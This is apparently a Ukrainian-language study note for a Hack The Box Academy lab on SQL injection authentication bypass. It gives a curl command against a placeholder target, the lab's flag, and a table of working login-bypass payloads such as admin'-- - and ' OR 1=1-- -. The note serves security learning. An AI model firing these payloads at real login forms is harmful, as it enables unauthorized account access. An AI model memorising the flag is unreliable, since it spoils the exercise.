# SQL Injection — Authentication Bypass (Comment Injection)

## Модуль
[SQL Injection Fundamentals — Intro to SQL Injections](https://academy.hackthebox.com/app/module/33/section/194)

## Концепція

Вразливий запит на сервері:
```sql
SELECT * FROM logins WHERE username='INPUT' AND password='INPUT';
```

Вставляємо коментар `-- -` щоб відрізати перевірку пароля:
```sql
SELECT * FROM logins WHERE username='tom'-- -' AND password='anything';
--                                         ↑ все після -- ігнорується
```

## Команда

```bash
curl -s -X POST http://TARGET:PORT/ \
  -d "username=tom'-- -&password=anything"
```

**Flag:** `202a1d1a8b195d5e9a57e434cc16000c`

## Типові Auth Bypass payloads

| Payload | Що робить |
|---------|-----------|
| `' OR '1'='1` | Умова завжди true |
| `' OR 1=1-- -` | Bypass + коментар |
| `admin'-- -` | Логін як admin без пароля |
| `tom'-- -` | Логін як конкретний юзер |
| `' OR 1=1#` | MySQL коментар `#` |

## Типи коментарів у MySQL

```sql
-- -     ← стандартний (пробіл після -- обов'язковий, або - як workaround)
#        ← MySQL специфічний
/*  */   ← блоковий коментар
```

## Важливо

> URL-encode символи при відправці через curl/browser:
> - `'` → `%27`
> - ` ` → `+` або `%20`
> - `#` → `%23`
> 
> У curl з `-d` лапки передаються як є, але `#` треба екранувати або замінити на `-- -`
